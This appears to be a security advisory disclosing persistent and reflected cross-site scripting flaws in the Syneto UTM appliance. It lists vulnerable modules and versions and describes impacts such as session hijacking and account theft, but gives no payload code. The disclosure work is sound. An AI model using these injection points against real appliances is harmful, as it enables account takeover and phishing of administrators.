Introduction:
=============
The Syneto UTM (Unified Threat Management) is a security appliance that performs multiple functions and delivers 
maximum protection against internet threats. It s a single device that has it all: firewall, gateway antivirus 
and anti-spam, VPN, content filter, multiple gateways and on-appliance reporting. Syneto UTM was specifically 
designed to easily be deployed and managed, supply top protection and save you money.

Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
High


Details:
========
1.1
Multiple persistent web vulnerabilities are detected on the Syneto Unified Threat Management Security Appliance Application.
The vulnerability allows an privileged user account to inject malicious persistent script code on application side(server).
Successful exploitation of the vulnerability can result in account steal, persistent session hijacking via script code inject, 
persistent external redirects, persistent context manipulation on requests & persistent phishing.

Vulnerable Module(s):
				[+] Reports => Executive Summery => Name Input Fields & Output Listing Category
				[+] EMail => Filter Add or Configure Edit
				[+] EMail => Add Blacklist Rule & Add Whitelist Rule
				[+] EMail Settings - New Domain

1.2
Multiple non-persistent cross site scripting vulnerabilities are detected on the Syneto Unified Threat Management Security 
Appliance Application. The vulnerability allows remote attacker to hijack customer/admin sessions via client side cross site 
scripting requests. Successful exploitation requires user inter action & results in account steal via session hijacking.

Vulnerable Module(s):
						[+] Index - Exception Handling via Errors
						[+] Index - Info Requests


Affected Version(s):
                               			[+] Synetos Security UTM Application v1.4.x & v1.3.3 Community Edition


Proof of Concept:
=================
The vulnerabilities can be exploited by privileged user accounts, lowviewers or remote attackers with required user inter action.
